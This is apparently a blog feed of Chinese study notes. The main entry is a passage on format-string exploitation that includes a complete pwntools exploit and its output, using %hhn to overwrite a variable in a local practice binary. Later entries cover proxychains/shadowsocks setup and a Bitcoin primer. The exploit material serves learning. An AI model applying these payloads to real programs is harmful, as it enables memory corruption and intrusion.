title="覆盖大数字"></a>覆盖大数字</h5><p>上面介绍了覆盖小数字，接下来介绍一下覆盖大数字。上面我们说了，我们可以选择直接一次性输出大数字个字节来进行覆盖，但是这样基本也不会成功，因为太长了。而且即使成功，我们一次性等待的时间也太长了，那么有没有什么比较好的方式呢？^__^当然有！(不然还写个p的笔记)</p><p>不过在介绍之前，我们得先再简单了解一下，变量在内存中的存储格式。首先，所有的变量在内存中都是以字节进行存储的。此外，在x86和x64的体系结构中，变量的存储格式为小端存储，即最低有效位存储在低地址(和我们通常习惯的顺序相反)。</p><p>举个例子，0x12345678在内存中由低地址到高地址依次为\x78\x56\x34\x12。再者，我们可以回忆一下格式化字符串里面的标志，可以发现有这么两个标志：</p><pre><code>hh    对于整数类型，printf期待一个从char提升的int尺寸的整型参数。输出一个字节h    对于整数类型，printf期待一个从short提升的int尺寸的整型参数。输出一个双字节</code></pre><p>所以说，我们可以利用 %hhn 向某个地址写入单字节，利用 %hn 向某个地址写入双字节。这里，我们以单字节为例。</p><p>我们准备覆盖b的值，先用ida看一下b的地址为多少</p><pre class="line-numbers language-shell"><code class="language-shell">.data:0804A028                 public b.data:0804A028 b               dd 1C8h                 ; DATA XREF: <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可以看出，b的地址为0x0804A028</p><p>我们希望将按照如下方式进行覆盖，前面为覆盖地址，后面为覆盖内容。</p><pre><code>0x0804A028 \x780x0804A029 \x560x0804A02a \x340x0804A02b \x12</code></pre><p>我们在前面确定相对偏移的过程中确定了格式化字符串的地址是格式化字符串的第6个参数。所以我们的payload基本上如下</p><pre><code>p32(0x0804A028)+p32(0x0804A029)+p32(0x0804A02a)+p32(0x0804A02b)+pad1+'%6$n'+pad2+'%7$n'+pad3'%8$n'+pad4'%9$n'</code></pre><p>给出一个基本构造如下：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">fmt</span><span class="token punctuation">(</span>prev<span class="token punctuation">,</span>word<span class="token punctuation">,</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> prev <span class="token operator">&lt;</span> word<span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#传过来的word依次为0x78,0x56,0x34,0x12;传过来的prev依次为4,0x78,0x56,0x34</span>        result <span class="token operator">=</span> word <span class="token operator">-</span> prev        fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>    <span class="token keyword">elif</span> prev <span class="token operator">==</span> word<span class="token punctuation">:</span>        result <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> <span class="token number">256</span> <span class="token operator">+</span> word <span class="token operator">-</span> prev        fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>    fmtstr <span class="token operator">+=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"$hhn"</span>         <span class="token keyword">print</span><span class="token punctuation">(</span>fmtstr<span class="token punctuation">)</span>    <span class="token keyword">return</span> fmtstr<span class="token keyword">def</span> <span class="token function">fmt_str</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span>size<span class="token punctuation">,</span>addr<span class="token punctuation">,</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> size <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>            payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>    prev <span class="token operator">=</span> len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">+=</span> fmt<span class="token punctuation">(</span>prev<span class="token punctuation">,</span><span class="token punctuation">(</span>target <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">,</span>offset <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#乘法运算优先级高于左移运算，右移8位是二进制的8位，转成16进制之后就是每次右移两位。'&amp;0xff'目的是除了最右边两位不变，其它位都置零。</span>        prev <span class="token operator">=</span> <span class="token punctuation">(</span>target <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>    <span class="token comment" spellcheck="true">#prev的初值为4,之后依次为0x78,0x56,0x34,0x12</span>    <span class="token keyword">return</span> payload    payload <span class="token operator">=</span> fmt_str<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x0804A028</span><span class="token punctuation">,</span><span class="token number">0x12345678</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中每个参数的含义基本如下</p><ul><li>offset表示要覆盖的地址的最初的偏移</li><li>size表示机器字长</li><li>addr表示将要覆盖的地址</li><li>target表示我们要覆盖为的目的变量值</li></ul><p>说实话一开始没太看懂这个payload的构造，于是我一步步分析了程序并先打印了这个fmt()函数的运行结果</p><blockquote><p>python运算中，乘法优先级在右移优先级之前。</p><p>pre1 = (0x12345678) &gt;&gt; 0 * 8</p><p>pre1 –&gt; 0x12345678</p><p>pre2 = pre1 &amp; 0xff</p><p>pre2 –&gt;0x78</p></blockquote><blockquote><p>fmt函数运行结果如下</p><p>%104c%6$hhn<br>%222c%7$hhn<br>%222c%8$hhn<br>%222c%9$hhn</p><p>payload结果如下</p><p>(\xa0\x04)\xa0\x04*\xa0\x04+\xa0\x04%104c%6$hhn%222c%7$hhn%222c%8$hhn%222c%9$hhn</p><p>payload前面一段是p32形式的攻击地址 后面%(num)c%(index)$hhn表示向第index个参数处以单字节的形式写入特定数值[0x78,0x56,0x34,0x12]</p></blockquote><p>完整的exploit如下</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#-*- coding=utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">fmt</span><span class="token punctuation">(</span>prev<span class="token punctuation">,</span>word<span class="token punctuation">,</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> prev <span class="token operator">&lt;</span> word<span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#传过来的word依次为0x78,0x56,0x34,0x12;传过来的prev依次为0x10,0x78,0x56,0x34</span>        result <span class="token operator">=</span> word <span class="token operator">-</span> prev        fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>    <span class="token keyword">elif</span> prev <span class="token operator">==</span> word<span class="token punctuation">:</span>        result <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>         result <span class="token operator">=</span> <span class="token number">256</span> <span class="token operator">+</span> word <span class="token operator">-</span> prev         fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>    fmtstr <span class="token operator">+=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"$hhn"</span>         <span class="token keyword">print</span><span class="token punctuation">(</span>fmtstr<span class="token punctuation">)</span>    <span class="token keyword">return</span> fmtstr<span class="token keyword">def</span> <span class="token function">fmt_str</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span>size<span class="token punctuation">,</span>addr<span class="token punctuation">,</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> size <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>            payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>    prev <span class="token operator">=</span> len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">+=</span> fmt<span class="token punctuation">(</span>prev<span class="token punctuation">,</span><span class="token punctuation">(</span>target <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">,</span>offset <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#乘法运算优先级高于左移运算，右移8位是二进制的8位，转成16进制之后就是每次右移两位。'&amp;0xff'目的是除了最右边两位不变，其它位都置零。</span>        prev <span class="token operator">=</span> <span class="token punctuation">(</span>target <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span> <span class="token comment" spellcheck="true">#prev的初值为4,之后依次为0x78,0x56,0x34,0x12</span>    <span class="token keyword">return</span> payload    <span class="token keyword">def</span> <span class="token function">proc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./overflow_1"</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> fmt_str<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x0804A028</span><span class="token punctuation">,</span><span class="token number">0x12345678</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>proc<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果如下</p><pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ python exploit.py [+] Starting local process './overflow_1': pid 2780%104c%6$hhn%222c%7$hhn%222c%8$hhn%222c%9$hhn(\xa0\x04)\xa0\x04*\xa0\x04+\xa0\x04%104c%6$hhn%222c%7$hhn%222c%8$hhn%222c%9$hhn0xff97f18c(\xa0\x04)\xa0\x04*\xa0\x04+\xa0\x04                                                                                                       (                                                                                                                                                                                                                             �                                                                                                                                                                                                                             \xbb                                                                                                                                                                                                                             Nmodified b for a big number![*] Switching to interactive mode[*] Got EOF while reading in interactive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>fmt()函数里的else部分我看了好久都没弄明白，为什么第一次写入0x78，后面还能写入0x56,0x34,0x12。因为写入的值是根据前面成功输出的字符个数来决定的，怎么会越写越小呢？</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">else</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token number">256</span> <span class="token operator">+</span> word <span class="token operator">-</span> prev    fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>fmtstr <span class="token operator">+=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"$hhn"</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>result = 256 + word - prev</strong>，可以看到word - prev = -(0x22)，而0x78-0x22就等于0x56，也就是我们想要写入的第二个值，那么为什么又要加256呢？</p><p><strong>%hhn是具有溢出功能的，前面成功输出的字符个数超过255就会从0重新开始计数(比如260就相当于260-256=4)。所以加256并不影响结果，那这里为什么要加256呢？因为word-prev的值是负数，不能直接使用%[num]c (num为负数)，于是先加256，在后面计算输出字符个数的时候会自动减去256。这时候就相当于写入了0x56，后面的0x34，0x12依次类推。</strong></p><blockquote><p>当然，我们也可以利用 %n 分别对每个地址进行写入，也可以得到对应的答案，但是由于我们写入的变量都只会影响由其开始的四个字节，所以最后一个变量写完之后，我们可能会修改之后的三个字节，如果这三个字节比较重要的话，程序就有可能因此崩溃。而采用 %hhn 则不会有这样的问题，因为这样只会修改相应地址的一个字节。</p><p>上面是CTF-Wiki写的，我个人的理解是用%n写入0x12345678这个数据,%n是把已经成功输出字符的个数写入对应指针指向的整型(int)变量，整型(int)变量占4个字节，但是使用%hhn只会修改1个字节。</p></blockquote><pre><code>                                                                                                                                                                                                                 �                                                                                                                                                                                                                             \xbb                                                                                                                                                                                                                             Nmodified b for a big number!</code></pre><p>[<em>] Switching to interactive mode<br>[</em>] Got EOF while reading in interactive</p><pre><code>fmt()函数里的else部分我看了好久都没弄明白，为什么第一次写入0x78，后面还能写入0x56,0x34,0x12。因为写入的值是根据前面成功输出的字符个数来决定的，怎么会越写越小呢？​```pythonelse:    result = 256 + word - prev    fmtstr = "%" + str(result) + "c"fmtstr += "%" + str(index) + "$hhn"  </code></pre><p><strong>result = 256 + word - prev</strong>，可以看到word - prev = -(0x22)，而0x78-0x22就等于0x56，也就是我们想要写入的第二个值，那么为什么又要加256呢？</p><p><strong>%hhn是具有溢出功能的，前面成功输出的字符个数超过255就会从0重新开始计数(比如260就相当于260-256=4)。所以加256并不影响结果，那这里为什么要加256呢？因为word-prev的值是负数，不能直接使用%[num]c (num为负数)，于是先加256，在后面计算输出字符个数的时候会自动减去256。这时候就相当于写入了0x56，后面的0x34，0x12依次类推。</strong></p><blockquote><p>当然，我们也可以利用 %n 分别对每个地址进行写入，也可以得到对应的答案，但是由于我们写入的变量都只会影响由其开始的四个字节，所以最后一个变量写完之后，我们可能会修改之后的三个字节，如果这三个字节比较重要的话，程序就有可能因此崩溃。而采用 %hhn 则不会有这样的问题，因为这样只会修改相应地址的一个字节。</p><p>上面是CTF-Wiki写的，我个人的理解是用%n写入0x12345678这个数据,%n是把已经成功输出字符的个数写入对应指针指向的整型(int)变量，整型(int)变量占4个字节，但是使用%hhn只会修改1个字节。</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> format string </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git clone提速|使用proxychains+代理服务</title>
      <link href="/2020/04/13/fast-git-clone/"/>
      <url>/2020/04/13/fast-git-clone/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>从 github上git clone资源，由于地域限制原因，大陆会特别慢，一般就在0-10KB/s的样子，用Xdown跑多线程都救不了。小项目都得等好久，大项目常规方式基本下不了。Windows现在可以使用国内的码云进行转接项目。但是对于linux虚拟机git clone的话，还是使用<strong>proxychain + 代理</strong>比较方便。</p><h2 id="kali-linux篇"><a href="#kali-linux篇" class="headerlink" title="kali linux篇"></a>kali linux篇</h2><blockquote><p>下面内容包括：<br>1.怎么从linux git clone自己的私库（涉及到RSA密码）<br>2.git clone from 太慢，怎么使用proxychains提速<br>3.如何安装linux的shadowsocks（官方教程亲测不行）</p></blockquote><h3 id="1-linux的github-ssh-key配置"><a href="#1-linux的github-ssh-key配置" class="headerlink" title="1.linux的github ssh key配置"></a>1.linux的github ssh key配置</h3><p><strong>（1）设置git 的user name 和email</strong><br>$ git config –global user.name “user_name”<br>$ git config –global user.email “<a href="mailto:xxx@gmail.com">xxx@gmail.com</a>“</p><p><strong>（2）生成密钥过程</strong><br>先查看有没有密钥（我就是弄了两次，第一次没弄好，一定要删除，不能把密钥弄混了）<br>用cd ~/.ssh命令查看是否生成密钥<br>生成密钥：<br>命令行：$ ssh-keygen -t rsa -C “<a href="mailto:xxx@gmail.com">xxx@gmail.com</a>”<br>连续三次回车，密码设置为空。</p><p>会得到两个文件：id_rsa和id_rsa.pub</p><p><strong>（3）github上添加密钥</strong><br>登录github，添加ssh，添加的密钥是id_rsa.pub里面的<br>添加好之后是这样的：<br><img src="https://img-blog.csdnimg.cn/20200412234232889.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="添加密钥成功"><br>如果还不行（我是可以），问题应该出在了git仓库没有和SSH key关联上，<br>命令行输入：ssh-add “你的 id-rsa 文件地址”<br>注意这里ssh-add后面填的是私钥地址<br>如mac电脑是 /Users/用户名/.ssh/id_rsa</p><p><strong>（4）测试：ssh <a href="mailto:git@github.com">git@github.com</a></strong></p><h3 id="2-kali使用proxychains-加速git-clone-from-github"><a href="#2-kali使用proxychains-加速git-clone-from-github" class="headerlink" title="2.kali使用proxychains 加速git clone from github"></a>2.kali使用proxychains 加速git clone from github</h3><p>仓库都搞好了，我应该高高兴兴去git clone了，然而…这速度能急死人，20%之后就特别慢了，国内能搜到的教程基本没用。<br><strong>安装proxychains</strong></p><pre><code>git clone https://github.com/rofl0r/proxychains-ngcd proxychains-ng./configuresudo make &amp;&amp; make installcp src/proxychains.conf /etc/proxychains.conf</code></pre><p><strong>配置proxychains</strong></p><pre><code>vim /etc/proxychains.conf在最后一行加上socks5  127.0.0.1 1080（只要socks5就行）</code></pre><p><img src="https://img-blog.csdnimg.cn/20200412235006812.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="配置完成"></p><h3 id="3-最后重点讲一下怎么在linux安装shadowsocks"><a href="#3-最后重点讲一下怎么在linux安装shadowsocks" class="headerlink" title="3.最后重点讲一下怎么在linux安装shadowsocks"></a>3.最后重点讲一下怎么在linux安装shadowsocks</h3><p><a href="https://www.jichang.uk/posts/shadowsocks-linux.html#%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86" target="_blank" rel="noopener">官网教程</a>（已失效）<br>第2点的proxychains我就是借鉴这个教程的（可用），但是它前面的那个shadowsocks安装方法已经失效了…被这个卡到抓狂。<br><a href="https://github.com/shadowsocks/shadowsocks-libev">有效教程</a><br><strong>（1）安装shadowsocks</strong></p><pre><code>apt install shadowsocks-libevvim /etc/shadowsocks.json</code></pre><p><strong>（2）配置shadowsocks</strong></p><pre><code>把在官网购买好的有效信息填进去即可，具体参考官网教程</code></pre><p><img src="https://img-blog.csdnimg.cn/2020041223525120.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="配置信息"><br><strong>（3）启动shadowsocks</strong></p><pre><code>ss-local -c /etc/shadowsocks.json</code></pre><p><img src="https://img-blog.csdnimg.cn/20200412235352377.jpg#pic_center" alt="启动成功"><br><strong>（4）使用proxychains4代理</strong><br>启动完成如上图，新建一个窗口proxychains4即可<br><img src="https://img-blog.csdnimg.cn/20200412235452333.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="使用代理加速下载"></p><hr><h2 id="ubuntu16-04-篇"><a href="#ubuntu16-04-篇" class="headerlink" title="ubuntu16.04 篇"></a>ubuntu16.04 篇</h2><blockquote><p>给kali装了shadowsocks之后，git clone 嗖嗖的。今天配ubuntu16.04，新装的机打pwn用，配置pwndbg的时候git clone下载特别慢就想着给ubuntu也挂个代理。</p></blockquote><h3 id="1-ubuntu和kali的区别"><a href="#1-ubuntu和kali的区别" class="headerlink" title="1.ubuntu和kali的区别"></a>1.ubuntu和kali的区别</h3><p>ubuntu16.04和kali linux的区别在于<strong>ubuntu16.04的PPA中支持shadowsocks-libev的下载</strong><br><a href="https://zhuanlan.zhihu.com/p/55250294" target="_blank" rel="noopener">什么是PPA？</a><br><a href="https://launchpad.net/~max-c-lv/+archive/ubuntu/shadowsocks-libev" target="_blank" rel="noopener">怎么把shadowsocks-libev添加到PPA中</a></p><h3 id="2-添加shadowsocks到PPA并安装"><a href="#2-添加shadowsocks到PPA并安装" class="headerlink" title="2.添加shadowsocks到PPA并安装"></a>2.添加shadowsocks到PPA并安装</h3><p><strong>安装过程</strong></p><pre><code>sudo add-apt-repository ppa:max-c-lv/shadowsocks-libevsudo apt-get updatesudo apt install shadowsocks-libev</code></pre><p><strong>配置shadowsocks</strong></p><pre><code>vim /etc/shadowsocks.json</code></pre><p><img src="https://img-blog.csdnimg.cn/20200413001501379.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="配置信息"></p><h3 id="3-下载proxychains"><a href="#3-下载proxychains" class="headerlink" title="3.下载proxychains"></a>3.下载proxychains</h3><p><strong>下载</strong></p><pre><code>apt install proxychains</code></pre><p><strong>配置</strong></p><pre><code>vim /etc/proxychains.conf最后一行加上 socks5 127.0.0.1 1080</code></pre><p><img src="https://img-blog.csdnimg.cn/20200413001643868.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="配置完成"><br><strong>使用proxychains+代理</strong></p><pre><code>ss-local -c /etc/shadowsocks.jsonproxychains git clone https://github.com/pwndbg/pwndbg</code></pre><blockquote><p>使用proxychains+代理，速度一般稳定在几百K/s，对于一般项目来说已经足够。</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> git clone提速 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> ubuntu16.04 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>区块链 | 比特币与区块链介绍以及区块链安全</title>
      <link href="/2020/04/12/block-chain/"/>
      <url>/2020/04/12/block-chain/</url>
      
        <content type="html"><![CDATA[<h1 id="第一节"><a href="#第一节" class="headerlink" title="第一节"></a>第一节</h1><blockquote><p>本节内容主要有：什么是比特币、比特币的起源与发展、区块及区块链的定义，矿机挖矿的原理。</p></blockquote><h2 id="什么是比特币"><a href="#什么是比特币" class="headerlink" title="什么是比特币"></a>什么是比特币</h2><p>比特币(BitCoin)是一种P2P形式的虚拟货币。2008年，一个名叫中本聪(Satoshi Nakamoto)的人发明了比特币，他在网络上发表了《比特币:一种点对点的电子现金系统》，即《白皮书》。点对点的传输意味着一个去中心化的电子记账系统的建立。</p><h3 id="去中心化的电子记账系统"><a href="#去中心化的电子记账系统" class="headerlink" title="去中心化的电子记账系统"></a>去中心化的电子记账系统</h3><p>和传统的记账方式不同（传统记账由银行来进行操作，可信度基于国家信用），去中心化则不需要依靠传统银行机构，每个人的账单记录都是公开的。<br><img src="https://img-blog.csdnimg.cn/20200412173201536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="传统记账系统"><br>举例来说，有A,B,C,D四个人进行交易，每次交易内容都会告诉其它三个人。<br><img src="https://img-blog.csdnimg.cn/20200412173320898.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="去中心化的记账系统"></p><hr><h2 id="区块-amp-amp-区块链"><a href="#区块-amp-amp-区块链" class="headerlink" title="区块&amp;&amp;区块链"></a>区块&amp;&amp;区块链</h2><p>A,B,C,D四个人的账单信息进行打包，就形成了一个<strong>区块(block)</strong>。一般来说一个区块的大小大约为1M，可以存放4000条左右的记录。<br><img src="https://img-blog.csdnimg.cn/20200412173953708.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="区块"><br>一个区块打包完成之后，把它接到前一个区块上，并且之后打包的区块接在目前这个区块之后，这样形成的一条链我们称为<strong>区块链(Block Chain)</strong>。<br><img src="https://img-blog.csdnimg.cn/20200412174527420.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="区块链"></p><h3 id="为何我需要记账？"><a href="#为何我需要记账？" class="headerlink" title="为何我需要记账？"></a>为何我需要记账？</h3><blockquote><p>记录和自己的资金不相干的账单，占用了自己的电脑资源，我们为什么要记账？</p></blockquote><p><strong>记账奖励</strong><br>记账是由于记账可以得到奖励。<br><strong>（1）手续费</strong><br>举例来说，A支付10个比特币给B，实际上A支付的要比10个比特币多一点，多出的一点就是给记账人的手续费。（比特币交易的手续费比传统交易的手续费低）<br><strong>（2）打包奖励</strong><br>从比特币系统运行开始，在第一个四年里，每打一次包奖励50个比特币，在第二个四年里，每打一个包奖励25个比特币，在第三个四年里，每打一个包奖励12.5个比特币…依次类推，每过一个四年，打包奖励少一半。</p><h4 id="比特币总量"><a href="#比特币总量" class="headerlink" title="比特币总量"></a>比特币总量</h4><p>中本聪在最初提出比特币时，规定每十分钟打一个包。我们可以计算出比特币总量如下：</p><blockquote><p>50 <em> 6 </em> 24 <em> 365 </em> 4 * (1/2 + 1/4 +1/8 + …(1/2)^n^)=2100万</p></blockquote><h3 id="账单以谁为准？"><a href="#账单以谁为准？" class="headerlink" title="账单以谁为准？"></a>账单以谁为准？</h3><blockquote><p>因为记账奖励丰厚，一群人抢着去进行打包，但由于网络延迟，可能每个人收到账单不同，这种时候该以谁为准？</p></blockquote><h4 id="工作量证明"><a href="#工作量证明" class="headerlink" title="工作量证明"></a>工作量证明</h4><p>每一个参与打包的用户都要去做一个很难的数学题，如果你可以做出这道数学题，就可以去进行打包了。这个数学题难到没有哪一个人可以通过脑子去计算出来，而必须通过一个一个数去尝试，直到你去把这个数尝试出来了，就有机会去获得奖励，这个过程叫做<strong>挖矿</strong>。</p><h3 id="挖矿原理"><a href="#挖矿原理" class="headerlink" title="挖矿原理"></a>挖矿原理</h3><h4 id="哈希函数"><a href="#哈希函数" class="headerlink" title="哈希函数"></a>哈希函数</h4><p><strong>我们可以通过运算，把一串字符串转化成为一个摘要的形式。</strong> 